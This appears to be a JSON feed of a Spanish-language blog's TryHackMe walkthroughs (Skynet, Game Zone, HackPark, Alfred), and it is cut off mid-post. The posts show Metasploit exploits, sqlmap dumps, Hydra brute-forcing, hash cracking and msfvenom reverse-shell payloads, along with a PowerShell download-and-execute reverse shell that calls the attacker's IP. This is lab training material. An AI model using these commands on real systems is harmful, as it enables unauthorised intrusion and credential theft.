exploit/linux/local/bpf_sign_extension_priv_esc [*] no payload configured, defaulting to linux/x64/meterpreter/reverse_tcp msf6 exploit(linux/local/bpf_sign_extension_priv_esc) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 module options (exploit/linux/local/bpf_sign_extension_priv_esc): name current setting required description ---- --------------- -------- ----------- compile auto yes compile on target (accepted: auto, true, false) session yes the session to run this module on payload options (linux/x64/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- lhost tun0 yes the listen address (an interface may be specified) lport 4444 yes the listen port exploit target: id name -- ---- 0 auto view the full module info with the info, or info -d command. msf6 exploit(linux/local/bpf_sign_extension_priv_esc) \u0026gt; set session 1 session =\u0026gt; 1 msf6 exploit(linux/local/bpf_sign_extension_priv_esc) \u0026gt; run [-] handler failed to bind to 10.x.x.x4444:- - [-] handler failed to bind to 0.0.0.0:4444:- - [*] running automatic check (\u0026#34;set autocheck false\u0026#34; to disable) [+] the target appears to be vulnerable. [*] writing \u0026#39;/tmp/.uoaqehbf\u0026#39; (250 bytes) ... [*] launching exploit ... [*] sending stage (3045380 bytes) to 10.10.126.64 [*] cleaning up /tmp/.uoaqehbf and /tmp/.cvexotd6d ... [*] meterpreter session 2 opened (10.x.x.x:4444 -\u0026gt; 10.10.126.64:33600) at 2023-09-02 13:36:02 +0200 [*] exploit completed, but no session was created. msf6 exploit(linux/local/bpf_sign_extension_priv_esc) \u0026gt; sessions 2 [*] starting interaction with 2... meterpreter \u0026gt; getuid server username: root una vez obtengo acceso como root, busco la bandera. meterpreter \u0026gt; cd /root meterpreter \u0026gt; ls listing: /root ============== mode size type last modified name ---- ---- ---- ------------- ---- 020666/rw-rw-rw- 0 cha 2023-09-02 10:55:49 +0200 .bash_history 100644/rw-r--r-- 3106 fil 2015-10-22 19:15:21 +0200 .bashrc 040700/rwx------ 4096 dir 2019-09-18 00:35:40 +0200 .cache 040755/rwxr-xr-x 4096 dir 2019-09-17 09:32:06 +0200 .nano 100644/rw-r--r-- 148 fil 2015-08-17 17:30:33 +0200 .profile 100644/rw-r--r-- 33 fil 2019-09-18 05:41:47 +0200 root.txt meterpreter \u0026gt; cat root.txt 3f0372db24753accc7179a282cd6a949 conclusion al no tener esa especie de guía que tenían las anteriores salas, he tenido que investigar un poco más de lo habitual. aún así, la máquina es bastante sencilla y no he tenido problemas para resolverla. sigue el mismo patrón que las máquinas de tryhackme: enumeración, explotación y escalada de privilegios. con un poco de paciencia y ganas, se puede resolver sin problemas. las herramientas que he usado son las habituales: nmap, enum4linux, dirb, burp, metasploit, hydra, smbclient, msfvenom, etc. una máquina muy recomendable y entretenida con ambientación de terminator.\n(◕‿‿◕) hack the planet! ","title":"Skynet [TryHackMe]"},{"date":"2023-09-01","image":"/images/post_pics/game-zone/game-zone.jpeg","link":"https://k3ssdev.github.io/posts/game-zone/","summary":"Introducción Continúo con el learning path “Offensive Pentesting¨, esta vez con una maquina sencilla que presenta un ejemplo práctico de SQL Injection con sqlmap y el uso de un túnel SSH para exponer un servicio bloqueado por firewall, para finalmente logra acceso privilegiado con Metaploit.","tags":["Easy","John","Linux","Metasploit","Privilege Escalation","SQLi","sqlmap","ssh-tunel","TryHackMe"],"text":"introducción continúo con el learning path “offensive pentesting¨, esta vez con una maquina sencilla que presenta un ejemplo práctico de sql injection con sqlmap y el uso de un túnel ssh para exponer un servicio bloqueado por firewall, para finalmente logra acceso privilegiado con metaploit.\ntask 1 - desplegar la máquina paso 1: pongo la máquina en marcha y accedo a la aplicación web que tiene. la primera pregunta es sobre la imagen de un personaje de videojuegos que aparece en la web. task 2 - obtain access via sqli paso 2: la sala propone usar ' or 1=1 -- - para forzar la autencicaci’on, engañando a la base de datos con 1=1 y comentando lo que haya detras con “—” para conseguirlo. la consulta sql que se ejecuta en el servidor web es la siguiente: select * from users where username = ' or 1=1 -- - and password := al conseguir hacer el bypass a la autenticación, accedo a portal.php task 3 - using sqlmap paso 3: recurrimos a sqlmap para volcar toda la base de datos de gamezone. capturo un post request buscando un juego en la web, usando burp suite, y lo guardo en un txt. post /portal.php http/1.1 host: 10.10.62.97 content-length: 15 cache-control: max-age=0 upgrade-insecure-requests: 1 origin: http://10.10.62.97 content-type: application/x-www-form-urlencoded user-agent: mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/116.0.5845.111 safari/537.36 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 referer: http://10.10.62.97/portal.php accept-encoding: gzip, deflate accept-language: es-es,es;q=0.9 cookie: phpsessid=nn8afcdulm4202grsvrrhspmn1 connection: close searchitem=game uso sqlmap como indica sugiere la sala para hacer un volcado de la base de datos. no funciona. sqlmap -r post_request.txt --dbms=mysql --dump busco sobre sqlmap y encuentro una forma diferente de hacerlo. empiezo por extraer los nombres de las bases de datos que hay. sqlmap -u \u0026#34;http://10.10.62.97/portal.php\u0026#34; --data=\u0026#34;searchitem=test\u0026#34; --dbs [16:03:29] [info] the back-end dbms is mysql web server operating system: linux ubuntu 16.04 or 16.10 (yakkety or xenial) web application technology: php, apache 2.4.18 back-end dbms: mysql \u0026gt;= 5.6 [16:03:30] [info] fetching database names available databases [5]: [*] db [*] information_schema [*] mysql [*] performance_schema [*] sys [16:03:30] [info] fetched data logged to text files under \u0026#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97\u0026#39; extraigo los nombres de las tablas en db sqlmap -u \u0026#34;http://10.10.62.97/portal.php\u0026#34; --data=\u0026#34;searchitem=test\u0026#34; -d db --tables [16:08:57] [info] the back-end dbms is mysql web server operating system: linux ubuntu 16.10 or 16.04 (yakkety or xenial) web application technology: apache 2.4.18, php back-end dbms: mysql \u0026gt;= 5.6 [16:08:57] [info] fetching tables for database: \u0026#39;db\u0026#39; database: db [2 tables] +-------+ | post | | users | +-------+ [16:08:57] [info] fetched data logged to text files under \u0026#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97\u0026#39; extraigo los datos de la tabla users. sqlmap -u \u0026#34;http://10.10.62.97/portal.php\u0026#34; --data=\u0026#34;searchitem=test\u0026#34; -d db -t users --columns [16:11:58] [info] the back-end dbms is mysql web server operating system: linux ubuntu 16.04 or 16.10 (xenial or yakkety) web application technology: php, apache 2.4.18 back-end dbms: mysql \u0026gt;= 5.6 [16:11:58] [info] fetching columns for table \u0026#39;users\u0026#39; in database \u0026#39;db\u0026#39; database: db table: users [2 columns] +----------+------+ | column | type | +----------+------+ | pwd | text | | username | text | +----------+------+ [16:11:58] [info] fetched data logged to text files under \u0026#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97\u0026#39; paso 4 sabiendo ya la estructura, hago el volcado con: sqlmap -u \u0026#34;http://10.10.62.97/portal.php\u0026#34; --data=\u0026#34;searchitem=test\u0026#34; -d db -t users -c pwd,username --dump [16:13:41] [info] the back-end dbms is mysql web server operating system: linux ubuntu 16.10 or 16.04 (xenial or yakkety) web application technology: php, apache 2.4.18 back-end dbms: mysql \u0026gt;= 5.6 [16:13:41] [info] fetching entries of column(s) \u0026#39;pwd,username\u0026#39; for table \u0026#39;users\u0026#39; in database \u0026#39;db\u0026#39; [16:13:41] [info] recognized possible password hashes in column \u0026#39;pwd\u0026#39; do you want to store hashes to a temporary file for eventual further processing with other tools [y/n] y [16:13:47] [info] writing hashes to a temporary file \u0026#39;/tmp/sqlmapt61grbs538569/sqlmaphashes-dwlpsyxn.txt\u0026#39; do you want to crack them via a dictionary-based attack? [y/n/q] y [16:13:54] [info] using hash method \u0026#39;sha256_generic_passwd\u0026#39; what dictionary do you want to use? [1] default dictionary file \u0026#39;/usr/share/sqlmap/data/txt/wordlist.tx_\u0026#39; (press enter) [2] custom dictionary file [3] file with list of dictionary files \u0026gt; /usr/share/wordlists/rockyou.txt [16:14:14] [info] using default dictionary do you want to use common password suffixes? (slow!) [y/n] n [16:14:18] [info] starting dictionary-based cracking (sha256_generic_passwd) [16:14:18] [info] starting 24 processes [16:14:20] [warning] no clear password(s) found database: db table: users [1 entry] +------------------------------------------------------------------+----------+ | pwd | username | +------------------------------------------------------------------+----------+ | ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47 | +------------------------------------------------------------------+----------+ [16:14:20] [info] table \u0026#39;db.users\u0026#39; dumped to csv file \u0026#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97/dump/db/users.csv\u0026#39; [16:14:20] [info] fetched data logged to text files under \u0026#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97\u0026#39; [*] ending @ 16:14:20 /2023-09-01/ task 4 - cracking the hash paso 5 uso hashid para identeficar el tipo de hash. parece probable que sea sha-256 hashid ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 analyzing \u0026#39;ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14\u0026#39; [+] snefru-256 [+] sha-256 [+] ripemd-256 [+] haval-256 [+] gost r 34.11-94 [+] gost cryptopro s-box [+] sha3-256 [+] skein-256 [+] skein-512(256) ataco el hash con john the ripper ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 using default input encoding: utf-8 loaded 1 password hash (raw-sha256 [sha256 256/256 avx2 8x]) warning: poor openmp scalability for this hash type, consider --fork=24 will run 24 openmp threads press \u0026#39;q\u0026#39; or ctrl-c to abort, almost any other key for status videogamer124 (?) 1g 0:00:00:00 done (2023-09-01 16:20) 6.666g/s 20971kp/s 20971kc/s 20971kc/s wildboy23..tom=tom use the \u0026#34;--show --format=raw-sha256\u0026#34; options to display all of the cracked passwords reliably session completed. paso 6 accedo por ssh con las credenciales y obtengo la bandera ❯ ssh agent47@10.10.62.97 the authenticity of host \u0026#39;10.10.62.97 (10.10.62.97)\u0026#39; can\u0026#39;t be established. ed25519 key fingerprint is sha256:cyjgmm67ufkdbnbkyum0dexci+lwun63sglfbvqqcla. this key is not known by any other names. are you sure you want to continue connecting (yes/no/[fingerprint])? yes warning: permanently added \u0026#39;10.10.62.97\u0026#39; (ed25519) to the list of known hosts. agent47@10.10.62.97\u0026#39;s password: welcome to ubuntu 16.04.6 lts (gnu/linux 4.4.0-159-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 109 packages can be updated. 68 updates are security updates. last login: fri aug 16 17:52:04 2019 from 192.168.1.147 agent47@gamezone:~$ whoami agent47 agent47@gamezone:~$ cat .bash_history .bash_logout .bashrc .cache/ .profile user.txt agent47@gamezone:~$ cat user.txt 649ac17b1480ac13ef1e4fa579dac95c task 5 - exposing services with reverse ssh tunnels paso 7 reviso los sockets en la maquina objetivo agent47@gamezone:~$ ss -tulpn netid state recv-q send-q local address:port peer address:port udp unconn 0 0 *:10000 *:* udp unconn 0 0 *:68 *:* tcp listen 0 80 127.0.0.1:3306 *:* tcp listen 0 128 *:10000 *:* tcp listen 0 128 *:22 *:* tcp listen 0 128 :::80 :::* tcp listen 0 128 :::22 :::* el puerto 10000 está siendo bloqueado por un firewall, lo expongo con un tunel ssh entre la maquina y mi equipo local. ❯ ssh -l 10000:localhost:10000 agent47@10.10.62.97 agent47@10.10.62.97\u0026#39;s password: welcome to ubuntu 16.04.6 lts (gnu/linux 4.4.0-159-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 109 packages can be updated. 68 updates are security updates. last login: fri sep 1 09:21:58 2023 from 10.14.50.184 desde mi equipo, accedo a la url http://localhost:10000/ esta corriendo webmin en ese socket, accedo con las credenciales de agent47 y veo que es la version 1.580 task 6 - privilege escalation with metasploit paso 7 busco en metasploit y configuro el exploit para usarlo. msf6 \u0026gt; search webmin matching modules ================ # name disclosure date rank check description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/webmin_show_cgi_exec 2012-09-06 excellent yes webmin /file/show.cgi remote command execution 1 auxiliary/admin/webmin/file_disclosure 2006-06-30 normal no webmin file disclosure 2 exploit/linux/http/webmin_file_manager_rce 2022-02-26 excellent yes webmin file manager rce 3 exploit/linux/http/webmin_package_updates_rce 2022-07-26 excellent yes webmin package updates rce 4 exploit/linux/http/webmin_packageup_rce 2019-05-16 excellent yes webmin package updates remote command execution 5 exploit/unix/webapp/webmin_upload_exec 2019-01-17 excellent yes webmin upload authenticated rce 6 auxiliary/admin/webmin/edit_html_fileaccess 2012-09-06 normal no webmin edit_html.cgi file parameter traversal arbitrary file access 7 exploit/linux/http/webmin_backdoor 2019-08-10 excellent yes webmin password_change.cgi backdoor interact with a module by name or index. for example info 7, use 7 or use exploit/linux/http/webmin_backdoor msf6 \u0026gt; use 0 msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set rhosts localhost rhosts =\u0026gt; localhost msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set username agent47 username =\u0026gt; agent47 msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set password videogamer124 password =\u0026gt; videogamer47 msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set ssl false [!] changing the ssl option\u0026#39;s value may require changing rport! ssl =\u0026gt; false msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set payload cmd/unix/reverse payload =\u0026gt; cmd/unix/reverse msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; set lhost tun0 ejecuto el exploit. msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; run [*] exploiting target ::1 ... [*] session 1 created in the background. abro sesión y obtengo acceso privilegiado. msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u0026gt; sessions 1 [*] starting interaction with 1... whoami root estabilizo el shell con python, busco el flag y lo imprimo por pantalla. python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; root@gamezone:~# cd cd root@gamezone:~# ls ls root.txt root@gamezone:~# cat root.txt cat root.txt a4b945830144bdd71908d12d902adeee conclusion game zone ha resultado ser una máquina bastante sencilla. he encontrado una dificultad a la hora de usar sqlmap como sugiere la sala, pero una búsqueda rápida me ha permitido encontrar una solución: usar sqlmap de más a menos, empezando por obtener los nombres de las bbdd y terminando con los datos de la tabla concreta que quería.\n(◕‿‿◕) hack the planet! ","title":"Game Zone [TryHackMe]"},{"date":"2023-08-30","image":"/images/post_pics/hackpark/hackpark.png","link":"https://k3ssdev.github.io/posts/hackpark/","summary":"Introducción Subimos un puntito el nivel de dificultad con “HackPark”, la siguiente máquina las series “Offensive Pentesting” de TryHackMe. En esta sala se practican cosas como la fuerza bruta con Hydra contra una app web, el uso de exploits con Metasploit y la elevación de privilegios en Windows.","tags":["Hydra","Medium","Meterpreter","Nishang","Powershell","Privilege Escalation","Reverse Shell","TryHackMe","Windows","WinPEAS"],"text":"introducción subimos un puntito el nivel de dificultad con “hackpark”, la siguiente máquina las series “offensive pentesting” de tryhackme. en esta sala se practican cosas como la fuerza bruta con hydra contra una app web, el uso de exploits con metasploit y la elevación de privilegios en windows.\ntask 1 - desplegar la máquina paso 1: pongo la máquina en marcha y accedo a la aplicación web que tiene. la primera pregunta es sobre la imagen que sale en la web, un famoso payaso de una película de miedo. task 2 - using hydra to brute-force a login paso 2: compruebo que hay formulario de login en la web. asumo que hay usuario “admin”. uso burp suite para obtener post del formulario. uso la información recogida en burp para construir un ataque de fuerza bruta con hydra. el login es admin / 1qaz2wsx # uso de hydra, el modulo http-post-form lleva 3 arugmentos [ url : request_body : mensaje_error] hydra -l admin -p /usr/share/wordlists/rockyou.txt 10.10.208.69 http-post-form \u0026#39;/account/login.aspx?returnurl=/admin:__viewstate=y6wrzsjzimymo53lfsrnxlb7%2b7fzabeyox49iqu3r14gnh%2ff8xhuzykujbrpjbk7rg8cxgjxjiod6jkbg86g17c0plg%2fqifxvi3j%2br5m4vum2igkcdzmw1rnlagtyccydujro7e4xqx2e458%2frv94ohbikbc7hshyfwhwpgk4heowjre\u0026amp;__eventvalidation=zibxajyntd%2bk8wtwtcectcm8t7r2qkzit%2b%2bo9vzfwt5gsvorujeinzflga4xe6yjp3whe5lkod%2bhlevcq0sbnlzmz1uvz1orx3iox66bzaxqhxqpjsxqnuabluebtgxh%2b8fytxrcmpaflar3uzloqtc%2fclru2nolntc2i%2fmjabyhqqhr\u0026amp;ctl00%24maincontent%24loginuser%24username=^user^\u0026amp;ctl00%24maincontent%24loginuser%24password=^pass^\u0026amp;ctl00%24maincontent%24loginuser%24loginbutton=iniciar+sesi%c3%b3n:login failed\u0026#39; -vv [verbose] resolving addresses ... [verbose] resolving done [verbose] page redirected to http[s]://10.10.208.69:80/admin [80][http-post-form] host: 10.10.208.69 login: admin password: 1qaz2wsx [status] attack finished for 10.10.208.69 (waiting for children to complete tests) task 3 - compromise the machine paso 3: webapp es blogengine versión 3.3.6.0 encuentro exploit cve-2019-6714 blogengine.net 3.3.6 - directory traversal / remote code execution paso 4: descargo exploit, cambio ip y puerto. renombro fichero a postview.ascx subo fichero al server en http://10.10.10.10/admin/app/editor/editpost.cshtml activo exploit al abrir http://10.10.10.10/?theme=../../app_data/files # shell inversa con éxito rlwrap nc -lvnp 4444 listening on [any] 4444 ... connect to [10.14.50.184] from (unknown) [10.10.208.69] 49268 microsoft windows [version 6.3.9600] (c) 2013 microsoft corporation. all rights reserved. whoami c:\\windows\\system32\\inetsrv\u0026gt;whoami iis apppool\\blog task 4 - windows privilege escalation paso 5: creo un payload con msfvenom para obtener sesión con meterpreter. utilizo el script x86/shikata_ga_nai # comando de msfvenom para crear el payload msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai lhost=10.14.50.184 lport=1234 -f exe -o shell-name.exe [-] no platform was selected, choosing msf::module::platform::windows from the payload found 1 compatible encoders attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 payload size: 381 bytes final size of exe file: 73802 bytes saved as: shell-name.exe paso 6: preparo metasploit con exploit/multi/handler inicio servidor web con python para descargarlo en el objetivo. # mestasploit msf6 \u0026gt; use exploit/multi/handler [*] using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set lhost tun0 msf6 exploit(multi/handler) \u0026gt; set lport 1234 msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; run [*] started reverse tcp handler on ... # servidor web con python python3 -m http.server 80 serving http on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... # netcat, comando en shell remota powershell -c \u0026#34;invoke-webrequest -uri \u0026#39;http://10.14.50.184/shell-name.exe\u0026#39; -outfile \u0026#39;c:\\windows\\temp\\shell.exe\u0026#39;\u0026#34; # el comnado run se ejecuta antes que .\\shell.exe msf6 exploit(multi/handler) \u0026gt; run # ejecuto shell en maquina remota .\\shell.exe [*] started reverse tcp handler on 10.14.50.184:1234 [*] sending stage (175686 bytes) to 10.10.208.69 [*] meterpreter session 7 opened (10.14.50.184:1234 -\u0026gt; 10.10.208.69:49314) at 2023-08-29 22:04:06 +0200 meterpreter # recopilo informacion del sistema meterpreter \u0026gt; sysinfo computer : hackpark os : windows 2012 r2 (6.3 build 9600). architecture : x64 system language : en_us domain : workgroup logged on users : 1 meterpreter : x86/windows # informacion de usuario sesión meterpreter \u0026gt; getuid server username: nt authority\\system encuentro servicio wscheduler corriendo en el sistema, reviso sus logs. meterpreter \u0026gt; ls listing: c:\\program files (x86)\\systemscheduler\\events ====================================================== mode size type last modified name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 1959 fil 2023-08-29 22:18:34 +0200 20198415519.ini 100666/rw-rw-rw- 30551 fil 2023-08-29 22:18:34 +0200 20198415519.ini_log.txt 100666/rw-rw-rw- 290 fil 2020-10-02 23:50:12 +0200 2020102145012.ini 100666/rw-rw-rw- 186 fil 2023-08-29 22:16:31 +0200 administrator.flg 100666/rw-rw-rw- 182 fil 2023-08-29 22:16:28 +0200 system_svc.flg 100666/rw-rw-rw- 0 fil 2023-08-29 20:44:12 +0200 scheduler.flg 100666/rw-rw-rw- 449 fil 2023-08-29 22:16:31 +0200 sessioninfo.flg 100666/rw-rw-rw- 0 fil 2023-08-29 22:17:39 +0200 service.flg meterpreter \u0026gt; cat 20198415519.ini_log.txt 08/04/19 15:06:01,event started ok, (administrator) 08/04/19 15:06:30,process ended. pid:2608,exitcode:1,message.exe (administrator) migro el proceso al de message.exe o ejecuto en meterpreter “getsystem” # flag de usuario jeff meterpreter \u0026gt; ls listing: c:\\users\\jeff\\desktop ============================== mode size type last modified name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 282 fil 2019-08-04 20:54:53 +0200 desktop.ini 100666/rw-rw-rw- 32 fil 2019-08-04 20:57:10 +0200 user.txt meterpreter \u0026gt; cat user.txt 759bd8af507517bcfaede78a21a73e39 # flag de root meterpreter \u0026gt; ls listing: c:\\users\\administrator\\desktop ======================================= mode size type last modified name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 1029 fil 2019-08-04 13:36:42 +0200 system scheduler.lnk 100666/rw-rw-rw- 282 fil 2019-08-03 19:43:54 +0200 desktop.ini 100666/rw-rw-rw- 32 fil 2019-08-04 20:51:42 +0200 root.txt meterpreter \u0026gt; cat root.txt 7e13d97f05f7ceb9881a3eb3d78d3e72 task 4 - privilege escalation without metasploit se puede conseguir acceso privilegiado sin metasploit. se crea paylod con msfvenom de windows/shell_reverse_tcp # genero el payload nuevo msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai lhost=10.14.50.184 lport=1234 -f exe -o shell_tcp.exe #preparo servidor python y lo descargo en la maquina remota # el listener recibe la conexion rlwrap nc -lvnp 1234 listening on [any] 1234 ... ls connect to [10.14.50.184] from (unknown) [10.10.208.69] 49397 dir microsoft windows [version 6.3.9600] (c) 2013 microsoft corporation. all rights reserved. c:\\windows\\temp\u0026gt; ejecucion de winpeas y busqueda de fecha de instalación original: # subo winpeas.bat y lo ejecuto. es un proceso largo y algo aburrido, asi que obtengo la fecha con systeminfo c:\\windows\\system32\\inetsrv\u0026gt;systeminfo | findstr /i date original install date: 8/3/2019, 10:43:23 am conclusion aunque se supone que ésta máquina es mas compleja que las anteriores, me he sentido cómodo usando burp suite, hydra, msfvenom y metasploit. la mayor parte de los problemas en esta sala me los he encontrado con las shells inversas, que no acaban de ser muy estables por lo que sea, excepto con meterpreter que si que ha ido bien. tampoco me ha parecido muy fluido el uso de winpeas, aunque es una herramienta interesante.\n(◕‿‿◕) hack the planet! ","title":"HackPark [TryHackMe]"},{"date":"2023-08-29","image":"/images/post_pics/alfred/alfred.png","link":"https://k3ssdev.github.io/posts/alfred/","summary":"Introducción La segunda sala del bloque “Advanced Exploitation” en el path “Offensive Pentesting”. En esta sala se aprende a explotar una configuración incorrecta en Jenkins, un servidor de automatización. Se utilizará Nishang en una aplicación Windows para obtener acceso inicial y escalada de privilegios.","tags":["Easy","Jenkins","Meterpreter","Privilege Escalation","tokens","TryHackMe","Windows"],"text":"introducción la segunda sala del bloque “advanced exploitation” en el path “offensive pentesting”. en esta sala se aprende a explotar una configuración incorrecta en jenkins, un servidor de automatización. se utilizará nishang en una aplicación windows para obtener acceso inicial y escalada de privilegios. en thm viene etiquetada como una sala fácil, pero powershell me sigue costando, lo que la vuelve un poco más complicada para mi.\ntask 1 - desplegar la máquina paso 1: escaneo la máquina desplegada para descubrir los servicios. encuentro 3 puertos abiertos. se encuentra página de login en el puerto 8080, usa jenkins. pruebo user/pass por defecto admin:admin y logro acceso. versión jenkins ver. 2.190.1 encuentro posible método rce - jenkins 2.150.2 - remote command execution (metasploit) obtengo acceso con meterpreter. pruebo el acceso tambien de forma manual con el script de powershell. # escaneo inicial con salida a fichero sudo nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial 10.10.123.255 # listo y filtro los puertos en nmap_inicial ports=$(cat nmap_inicial | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f1 | xargs | tr \u0026#39; \u0026#39; \u0026#39;,\u0026#39;) # escaneo final con los puertos guardados nmap -p$ports -sc -sv -pn -on nmap_final 10.10.123.255 resultado nmap: nmap scan report for 10.10.123.255 host is up (0.049s latency). not shown: 65532 filtered tcp ports (no-response) port state service 80/tcp open http 3389/tcp open ms-wbt-server 8080/tcp open http-proxy brute-force login con metasploit: # busco jenkins en metasploit msf6 \u0026gt; search jenkins matching modules ================ # name disclosure date rank check description - ---- --------------- ---- ----- ----------- 0 exploit/windows/misc/ibm_websphere_java_deserialize 2015-11-06 excellent no ibm websphere rce java deserialization vulnerability 1 exploit/multi/http/jenkins_metaprogramming 2019-01-08 excellent yes jenkins acl bypass and metaprogramming rce 2 exploit/linux/http/jenkins_cli_deserialization 2017-04-26 excellent yes jenkins cli deserialization 3 exploit/linux/misc/jenkins_ldap_deserialize 2016-11-16 excellent yes jenkins cli http java deserialization vulnerability 4 exploit/linux/misc/jenkins_java_deserialize 2015-11-18 excellent yes jenkins cli rmi java deserialization vulnerability 5 post/multi/gather/jenkins_gather normal no jenkins credential collector 6 auxiliary/gather/jenkins_cred_recovery normal yes jenkins domain credential recovery 7 auxiliary/scanner/jenkins/jenkins_udp_broadcast_enum normal no jenkins server broadcast enumeration 8 exploit/multi/http/jenkins_xstream_deserialize 2016-02-24 excellent yes jenkins xstream groovy classpath deserialization vulnerability 9 auxiliary/scanner/http/jenkins_enum normal no jenkins-ci enumeration 10 auxiliary/scanner/http/jenkins_login normal no jenkins-ci login utility 11 exploit/multi/http/jenkins_script_console 2013-01-18 good yes jenkins-ci script-console java execution 12 auxiliary/scanner/http/jenkins_command normal no jenkins-ci unauthenticated script-console scanner 13 exploit/linux/misc/opennms_java_serialize 2015-11-06 normal no opennms java object unserialization remote code execution msf6 \u0026gt; use 10 msf6 auxiliary(scanner/http/jenkins_login) \u0026gt; set rhosts 10.10.123.255 rhosts =\u0026gt; 10.10.123.255 # elijo el modulo de login y reviso opciones module options (auxiliary/scanner/http/jenkins_login): name current setting required description ---- --------------- -------- ----------- blank_passwords true no try blank passwords for all users bruteforce_speed 5 yes how fast to bruteforce, from 0 to 5 db_all_creds true no try each user/password couple stored in the current database db_all_pass false no add all passwords in the current database to the list db_all_users false no add all users in the current database to the list db_skip_existing none no skip existing credentials stored in the current database (accepted: none, user, user\u0026amp;realm) http_method post yes the http method to use for the login (accepted: get, post) password no a specific password to authenticate with pass_file no file containing passwords, one per line proxies no a proxy chain of format type:host:port[,type:host:port][...] rhosts 10.10.123.255 yes the target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html rport 8080 yes the target port (tcp) ssl false no negotiate ssl/tls for outgoing connections stop_on_success false yes stop guessing when a credential works for a host targeturi no the path to the jenkins-ci application threads 1 yes the number of concurrent threads (max one per host) username no a specific username to authenticate as userpass_file no file containing users and passwords separated by space, one pair per line user_as_pass false no try the username as the password for all users user_file no file containing usernames, one per line verbose true yes whether to print output for all attempts vhost no http server virtual host # selecciono wordlist de user/pass comunes msf6 auxiliary(scanner/http/jenkins_login) \u0026gt; set userpass_file /usr/share/wordlists/metasploit/default_userpass_for_services_unhash.txt userpass_file =\u0026gt; /usr/share/wordlists/metasploit/default_userpass_for_services_unhash.txt msf6 auxiliary(scanner/http/jenkins_login) \u0026gt; run # encuentro login [+] 10.10.123.255:8080 - login successful: admin:admin rce con metasploit: # configuro lhost y rhosts msf6 exploit(multi/http/jenkins_script_console) \u0026gt; set lhost tun0 msf6 exploit(multi/http/jenkins_script_console) \u0026gt; set rhosts 10.10.199.157 rhosts =\u0026gt; 10.10.199.157 msf6 exploit(multi/http/jenkins_script_console) \u0026gt; set rport 8080 rport =\u0026gt; 8080 # indico user/pass msf6 exploit(multi/http/jenkins_script_console) \u0026gt; set username admin username =\u0026gt; admin msf6 exploit(multi/http/jenkins_script_console) \u0026gt; set password admin password =\u0026gt; admin # ejecuto el exploit msf6 exploit(multi/http/jenkins_script_console) \u0026gt; run [*] started reverse tcp handler on 10.14.50.184:4444 [*] checking access to the script console [*] logging in... [*] using csrf token: \u0026#39;f977d727b64f7f6bcda0835d0bd4730dc4b348c303de26e296cc95358eab60e1\u0026#39; (jenkins-crumb style v1) [*] 10.10.199.157:8080 - sending command stager... [*] command stager progress - 2.06% done (2048/99626 bytes) [*] command stager progress - 4.11% done (4096/99626 bytes) [*] command stager progress - 6.17% done (6144/99626 bytes) ... [*] sending stage (175686 bytes) to 10.10.199.157 [*] meterpreter session 1 opened (10.14.50.184:4444 -\u0026gt; 10.10.199.157:49212) at 2023-08-28 18:01:49 +0200 meterpreter \u0026gt; ls listing: c:\\program files (x86)\\jenkins ======================================= mode size type last modified name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 0 fil 2023-08-28 17:41:44 +0200 .laststarted ... reverse shell manual: # creo servidor con python donde tengo el script de powershell python3 -m http.server 80 # creo un listener con netcat nc -lvnp 1234 # ejecuto comando en consola-web a traves de un proyecto nuevo y se crea la conexion powershell iex (new-object net.webclient).downloadstring(\u0026#39;http://your-ip:your-port/invoke-powershelltcp.ps1\u0026#39;);invoke-powershelltcp -reverse -ipaddress your-ip -port your-port task 2 - switching shells paso 2: se crea un payload con msfvenom. el payload contiene el mismo código que el script anterior shikata_ga_nai. el shell será un reverse_tcp de meterpreter. es lo mismo que lo realizado en el paso 1 usando directamente el exploit en metasploit. # genero payload con msfvenom msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai lhost=10.14.50.184 lport=1234 -f exe -o shell-name.exe [-] no platform was selected, choosing msf::module::platform::windows from the payload found 1 